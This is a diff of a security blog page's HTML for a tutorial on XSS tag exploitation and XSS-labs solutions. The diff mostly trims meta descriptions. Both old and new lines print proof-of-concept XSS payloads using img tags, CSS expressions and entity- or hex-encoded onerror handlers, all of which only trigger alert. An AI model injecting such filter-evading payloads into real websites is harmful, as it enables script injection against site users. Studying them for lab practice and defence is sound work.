@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="0x00常见的标签利用 标签XSS利用 11234567&amp;lt;img src=javascript:alert(&amp;apos;xss&amp;apos;)&amp;gt;   //版本，E7.0|IE6.0，才能执行 &amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt;  //版本，E7.0|IE6.0，才能执行 &amp;lt;img src=&amp;">
+<meta name="description" content="0x00常见的标签利用">
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS中常见标签利用以及XSS-labs通关攻略">
 <meta property="og:url" content="https://Horizoncy.github.io/2020/07/30/XSS中常见标签利用以及XSS-labs通关攻略/index.html">
 <meta property="og:site_name" content="Horizon&#39;s Security Notes">
-<meta property="og:description" content="0x00常见的标签利用 标签XSS利用 11234567&amp;lt;img src=javascript:alert(&amp;apos;xss&amp;apos;)&amp;gt;   //版本，E7.0|IE6.0，才能执行 &amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt;  //版本，E7.0|IE6.0，才能执行 &amp;lt;img src=&amp;">
+<meta property="og:description" content="0x00常见的标签利用">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-08-02T14:00:28.991Z">
+<meta property="og:updated_time" content="2020-08-02T14:18:47.586Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS中常见标签利用以及XSS-labs通关攻略">
-<meta name="twitter:description" content="0x00常见的标签利用 标签XSS利用 11234567&amp;lt;img src=javascript:alert(&amp;apos;xss&amp;apos;)&amp;gt;   //版本，E7.0|IE6.0，才能执行 &amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt;  //版本，E7.0|IE6.0，才能执行 &amp;lt;img src=&amp;">
+<meta name="twitter:description" content="0x00常见的标签利用">
 
 
 
@@ -383,7 +383,8 @@
       
 
       
-        <h1 id="0x00常见的标签利用"><a href="#0x00常见的标签利用" class="headerlink" title="0x00常见的标签利用"></a>0x00常见的标签利用</h1><h2 id="标签"><a href="#标签" class="headerlink" title=" 标签"></a><img> 标签</h2><h3 id="XSS利用-1"><a href="#XSS利用-1" class="headerlink" title="XSS利用 1"></a>XSS利用 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;   //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">&lt;img src=&quot;URL&quot; style=&apos;Xss:expression(alert(/xss/));&apos;&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">CSS标记XSS</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;))&quot;&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">CSS样式表的标记进行XSS转码</span><br><span class="line">&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;   //版本，E7.0|IE6.0，才能执行</span><br></pre></td></tr></table></figure>
+        <h1 id="0x00常见的标签利用"><a href="#0x00常见的标签利用" class="headerlink" title="0x00常见的标签利用"></a>0x00常见的标签利用</h1><a id="more"></a>
+<h2 id="标签"><a href="#标签" class="headerlink" title=" 标签"></a><img> 标签</h2><h3 id="XSS利用-1"><a href="#XSS利用-1" class="headerlink" title="XSS利用 1"></a>XSS利用 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;   //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">&lt;img src=&quot;URL&quot; style=&apos;Xss:expression(alert(/xss/));&apos;&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">CSS标记XSS</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;))&quot;&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">CSS样式表的标记进行XSS转码</span><br><span class="line">&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;   //版本，E7.0|IE6.0，才能执行</span><br></pre></td></tr></table></figure>
 
 <h3 id="XSS利用2："><a href="#XSS利用2：" class="headerlink" title="XSS利用2："></a>XSS利用2：</h3><p>html编码: </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; //可以不加&quot;和; </span><br><span class="line">原code:</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt; </span><br><span class="line">16进制编码ASCII: &lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  //必须要有双引号，不然执行不了 </span><br><span class="line">原code:</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;&lt;/img&gt; //可以去掉双引号</span><br></pre></td></tr></table></figure>
